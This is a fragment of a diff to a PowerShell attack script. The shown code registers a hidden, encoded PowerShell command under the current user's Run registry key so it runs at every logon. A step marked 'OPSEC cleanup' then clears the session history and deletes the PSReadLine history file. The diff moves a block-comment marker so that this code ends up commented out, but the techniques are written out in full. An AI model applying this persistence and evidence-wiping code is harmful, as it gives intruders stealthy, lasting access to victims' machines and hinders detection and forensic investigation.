@@ -11,7 +11,7 @@ Write-Host $encodedPayload
 -Value "powershell.exe -nop -windowstyle hidden `
 -encodedcommand $encodedPayload" `
 -PropertyType String -Force
-#>
+
 
 # Define the registry path
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -33,3 +33,5 @@ $encodedPayload"
 
 # Clear history (OPSEC cleanup) Clear-History
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+#>
